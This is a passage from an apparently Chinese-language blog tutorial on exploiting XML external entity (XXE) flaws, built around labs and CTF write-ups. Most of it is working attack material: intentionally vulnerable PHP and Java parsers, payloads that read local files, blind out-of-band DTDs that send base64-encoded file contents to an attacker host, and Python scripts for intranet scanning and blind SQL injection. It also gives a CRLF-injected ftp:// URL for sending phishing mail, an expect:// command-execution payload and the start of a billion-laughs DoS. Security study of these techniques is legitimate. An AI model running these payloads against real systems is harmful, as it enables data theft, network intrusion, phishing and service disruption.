&gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><h3 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></h3><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>本地服务器上放上解析 XML 的 php 代码：</p><p><strong>示例代码：</strong></p><p><strong>xml.php</strong> </p><pre><code class="hljs">&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&#39;php://input&#39;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><p><strong>payload:</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p><strong>结果如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/XXE%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6.png" alt="此处输入图片的描述"></p><p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%B8%A6%E6%9C%89%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E7%9A%84%E6%96%87%E4%BB%B6.png" alt="此处输入图片的描述"></p><p>我们试一下：</p><p><strong>结果如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AF%BB%E5%8F%96%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99.png" alt="此处输入图片的描述"></p><p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下(引用自我的一片介绍 XML 的博客)：</p><blockquote><p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br>“ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p><pre><code class="hljs">&lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt;</code></pre><p>可以输入任意字符除了 ]]&gt; 不能嵌套</p><p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</p></blockquote><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p><p>首先，找到问题出现的地方，问题出现在 </p><pre><code class="hljs">...&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “<![CDATA["和 “]]>”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p><p><strong>结果如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AE%9E%E4%BD%93%E8%BF%9E%E7%BB%AD%E5%BC%95%E7%94%A8.png" alt="此处输入图片的描述"></p><p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD<br>中拼接，我们知道我们只有一种选择，就是使用 参数实体</p><p><strong>payload:</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p><strong>evil.dtd</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p><strong>结果如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AF%BB%E5%8F%96%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E6%88%90%E5%8A%9F.png" alt="此处输入图片的描述"></p><p>感兴趣的童鞋可以分析一下整个调用过程，因为我在下面的例子中有分析一个类似的例子，于是出于篇幅考虑我这里就不分析了。</p><blockquote><p><strong>注意：</strong></p><p>这里提一个点，如果是在 java 中 还有一个协议能代替 file 协议 ，那就是 netdoc ，使用方法我会在后面的分析 微信的 XXE<br>的时候顺带演示</p></blockquote><h3 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a><strong>新的问题出现</strong></h3><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p><h3 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a><strong>新的解决方法</strong></h3><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p><h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></h3><p><strong>xml.php</strong> </p><pre><code class="hljs">&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&#39;php://input&#39;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt;</code></pre><p><strong>test.dtd</strong></p><pre><code class="hljs">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p><strong>payload：</strong></p><pre><code class="hljs">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/XXE%20%E6%97%A0%E5%9B%9E%E6%98%BE%20payload.png" alt="此处输入图片的描述"></p><p><strong>结果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E6%94%B6.png" alt="此处输入图片的描述"></p><p>我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。</p><p><strong>整个调用过程：</strong></p><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><h3 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a><strong>新的思考：</strong></h3><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><h3 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a><strong>新的利用：</strong></h3><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%94%AF%E6%8C%81%E5%8D%8F%E8%AE%AE11.png" alt="此处输入图片的描述"></p><p>PHP在安装扩展以后还能支持的协议：</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%94%AF%E6%8C%81%E5%8D%8F%E8%AE%AE%E6%89%A9%E5%B1%95.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong></p><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br>update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p></blockquote><h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a><strong>实验三：HTTP 内网主机探测</strong></h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 文件以后我们就有了大致的探测方向了</p><p><strong>下面是一个探测脚本的实例：</strong></p><pre><code class="hljs">import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;send_xml(xml)def send_xml(xml):headers = &#123;&#39;Content-Type&#39;: &#39;application/xml&#39;&#125;x = requests.post(&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;, data=xml, headers=headers, timeout=5).textcoded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded valueprint coded_string#print base64.b64decode(coded_string)for i in range(1, 255):try:i = str(i)ip = &#39;10.0.0.&#39; + istring = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;print stringbuild_xml(string)except:continue</code></pre><p><strong>返回结果：</strong></p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E7%BB%93%E6%9E%9C.png" alt="此处输入图片的描述"></p><h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a><strong>实验四：HTTP 内网主机端口扫描</strong></h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p><p><strong>比如我们传入：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;/data&gt;</code></pre><p><strong>返回结果：</strong></p><pre><code class="hljs">javax.xml.bind.UnmarshalException   - with linked exception:[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalExceptionException Description: An error occurred unmarshalling the document  Internal Exception: ████████████████████████: Connection refused</code></pre><p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/bp%20%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B.png" alt="此处输入图片的描述"></p><p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p><h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a><strong>实验五：内网盲注(CTF)</strong></h3><p>2018 强网杯 有一道题就是利用  XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p><p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BC%BA%E7%BD%91%E6%9D%AFXXE1.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BC%BA%E7%BD%91%E6%9D%AFXXE2.png" alt="此处输入图片的描述"></p><p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p><pre><code class="hljs">/var/www/52dandan.cc/public_html/config.php</code></pre><p>拿到第一部分 flag </p><pre><code class="hljs">&lt;?phpdefine(BASEDIR, &quot;/var/www/52dandan.club/&quot;);define(FLAG_SIG, 1);define(SECRETFILE,&#39;/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&#39;);....?&gt;</code></pre><blockquote><p><strong>注意：</strong></p><p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法</p><pre><code class="hljs">压缩：echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);解压：echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;);</code></pre></blockquote><p>然后我们考虑内网有没有东西，我们读取</p><pre><code class="hljs">/proc/net/arp/etc/host</code></pre><p>找到内网的另一台服务器的 ip 地址 192.168.223.18 </p><p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php  ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import requestsurl = &#39;http://39.107.33.75:33899/common.php&#39;s = requests.Session()result = &#39;&#39;data = &#123;        &quot;name&quot;:&quot;evil_man&quot;,        &quot;email&quot;:&quot;testabcdefg@gmail.com&quot;,        &quot;comment&quot;:&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;                &lt;!DOCTYPE root [                &lt;!ENTITY % dtd SYSTEM &quot;http://evil_host/evil.dtd&quot;&gt;                %dtd;]&gt;                &quot;&quot;&quot;&#125;for i in range(0,28):        for j in range(48,123):                f = open(&#39;./evil.dtd&#39;,&#39;w&#39;)        payload2 = &quot;&quot;&quot;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3&#39;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(&#39;&#123;&#125;&#39;))then(0)else(1)end)-&#39;1&quot;&gt;                &lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://evil_host/?result=%file;&#39;&gt;&quot;&gt;                %all;                %send;&quot;&quot;&quot;.format(&#39;_&#39;*i+chr(j)+&#39;_&#39;*(27-i))                f.write(payload2)                f.close()                print &#39;test &#123;&#125;&#39;.format(chr(j))                r = s.post(url,data=data)                if &quot;Oti3a3LeLPdkPkqKF84xs=&quot; in r.content and chr(j)!=&#39;_&#39;:                        result += chr(j)                        print chr(j)                        breakprint result</code></pre><p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p><h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:&#x2F;&#x2F; ， php  中的 phar:&#x2F;&#x2F; 似乎就是为了实现 jar:&#x2F;&#x2F; 的类似的功能设计出来的。</p><p><strong>jar:&#x2F;&#x2F; 协议的格式：</strong></p><pre><code class="hljs">jar:&#123;url&#125;!&#123;path&#125; </code></pre><p><strong>实例：</strong></p><pre><code class="hljs">jar:http://host/application.jar!/file/within/the/zip这个 ! 后面就是其需要从中解压出的文件</code></pre><p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:&#x2F;&#x2F; 是没法远程加载文件的（因此 phar:&#x2F;&#x2F; 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的  phar:&#x2F;&#x2F; 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar&#x2F;zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><blockquote><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><p>因为在 java 中 file:&#x2F;&#x2F;&#x2F; 协议可以起到列目录的作用，所以我们能用 file:&#x2F;&#x2F;&#x2F; 协议配合 jar:&#x2F;&#x2F; 协议使用</p></blockquote><p>下面是我的一些测试过程：</p><p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p><p><strong>示例代码：</strong></p><p><strong>xml_test.java</strong> </p><pre><code class="hljs">package xml_test;import java.io.File;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import org.w3c.dom.Attr;import org.w3c.dom.Comment;import org.w3c.dom.Document;import org.w3c.dom.Element;import org.w3c.dom.NamedNodeMap;import org.w3c.dom.Node;import org.w3c.dom.NodeList;/** * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上 * @author zhanglong * */public class xml_test&#123;    public static void main(String[] args) throws Exception    &#123;        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();        DocumentBuilder db = dbf.newDocumentBuilder();        Document doc = db.parse(new File(&quot;student.xml&quot;));        //获得根元素结点        Element root = doc.getDocumentElement();        parseElement(root);    &#125;    private static void parseElement(Element element)    &#123;        String tagName = element.getNodeName();        NodeList children = element.getChildNodes();        System.out.print(&quot;&lt;&quot; + tagName);        //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断        NamedNodeMap map = element.getAttributes();        //如果该元素存在属性        if(null != map)        &#123;            for(int i = 0; i &lt; map.getLength(); i++)            &#123;                //获得该元素的每一个属性                Attr attr = (Attr)map.item(i);                String attrName = attr.getName();                String attrValue = attr.getValue();                System.out.print(&quot; &quot; + attrName + &quot;=\&quot;&quot; + attrValue + &quot;\&quot;&quot;);            &#125;        &#125;        System.out.print(&quot;&gt;&quot;);        for(int i = 0; i &lt; children.getLength(); i++)        &#123;            Node node = children.item(i);            //获得结点的类型            short nodeType = node.getNodeType();            if(nodeType == Node.ELEMENT_NODE)            &#123;                //是元素，继续递归                parseElement((Element)node);            &#125;            else if(nodeType == Node.TEXT_NODE)            &#123;                //递归出口                System.out.print(node.getNodeValue());            &#125;            else if(nodeType == Node.COMMENT_NODE)            &#123;                System.out.print(&quot;&lt;!--&quot;);                Comment comment = (Comment)node;                //注释内容                String data = comment.getData();                System.out.print(data);                System.out.print(&quot;--&gt;&quot;);            &#125;        &#125;        System.out.print(&quot;&lt;/&quot; + tagName + &quot;&gt;&quot;);    &#125;&#125;</code></pre><p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml </p><p><strong>student.xml</strong> </p><pre><code class="hljs">&lt;!DOCTYPE convert [ &lt;!ENTITY  remote SYSTEM &quot;jar:http://localhost:9999/jar.zip!/wm.php&quot;&gt;]&gt;&lt;convert&gt;&amp;remote;&lt;/convert&gt;</code></pre><p><strong>目录结构如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="此处输入图片的描述"></p><p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p><p><strong>示例代码：</strong></p><p><strong>sever.py</strong></p><pre><code class="hljs">import sys import time import threading import socketserver from urllib.parse import quote import http.client as httpc listen_host = &#39;localhost&#39; listen_port = 9999 jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler):  def handle(self):http_req = b&#39;&#39;print(&#39;New connection:&#39;,self.client_address)while b&#39;\r\n\r\n&#39; not in http_req:try:http_req += self.request.recv(4096)print(&#39;Client req:\r\n&#39;,http_req.decode())jf = open(jar_file, &#39;rb&#39;)contents = jf.read()headers = (&#39;&#39;&#39;HTTP/1.0 200 OK\r\n&#39;&#39;&#39;&#39;&#39;&#39;Content-Type: application/java-archive\r\n\r\n&#39;&#39;&#39;)self.request.sendall(headers.encode(&#39;ascii&#39;))self.request.sendall(contents[:-1])time.sleep(30)print(30)self.request.sendall(contents[-1:])except Exception as e:print (&quot;get error at:&quot;+str(e))if __name__ == &#39;__main__&#39;:jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) print (&#39;waiting for connection...&#39;) server_thread = threading.Thread(target=jarserver.serve_forever) server_thread.daemon = True server_thread.start() server_thread.join()</code></pre><p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</p><p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p><blockquote><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar&#x2F;zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p></blockquote><p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p><pre><code class="hljs">jar:http://localhost:9999/jar.zip!/1.php</code></pre><p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p><p><strong>如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Java%E8%A7%A3%E6%9E%90%E6%8A%A5%E9%94%99.png" alt="此处输入图片的描述"></p><p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p><p><strong>下面是我的实验录屏：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/test.gif" alt="此处输入图片的描述"></p><p>实验就到这一步了，怎么利用就看各位大佬的了（坏笑）</p><p>我后来在LCTF 2018 出了这样一个 CTF 题目，详细的 wp 可以看我的<a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">这篇文章</a></p><h3 id="实验七：钓鱼："><a href="#实验七：钓鱼：" class="headerlink" title="实验七：钓鱼："></a><strong>实验七：钓鱼：</strong></h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用  ftp:&#x2F;&#x2F; 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p><p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p><p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">ftp://a%0D%0AEHLO%20a%0D%0AMAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0ADATA%0D%0AFrom%3A%20support%40VULNERABLESYSTEM.com%0ATo%3A%20victim%40gmail.com%0ASubject%3A%20test%0A%0Atest!%0A%0D%0A.%0D%0AQUIT%0D%0A:a@VULNERABLESYSTEM.com:25</code></pre><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">ftp://aEHLO aMAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;RCPT TO: &lt;victim@gmail.com&gt;DATAFrom: support@VULNERABLESYSTEM.comTo: victim@gmail.comSubject: Reset your passwordWe need to confirm your identity. Confirm your password here: http://PHISHING_URL.com.QUIT:support@VULNERABLESYSTEM.com:25</code></pre><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p><h3 id="实验八：其他："><a href="#实验八：其他：" class="headerlink" title="实验八：其他："></a><strong>实验八：其他：</strong></h3><p>除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：</p><h4 id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE </p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;dir&gt;&lt;file&gt;&amp;cmd;&lt;/file&gt;&lt;/dir&gt;</code></pre><h4 id="2-利用-XXE-进行-DOS-攻击"><a href="#2-利用-XXE-进行-DOS-攻击" class="headerlink" title="2. 利用 XXE 进行 DOS 攻击"></a><strong>2. 利用 XXE 进行 DOS 攻击</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 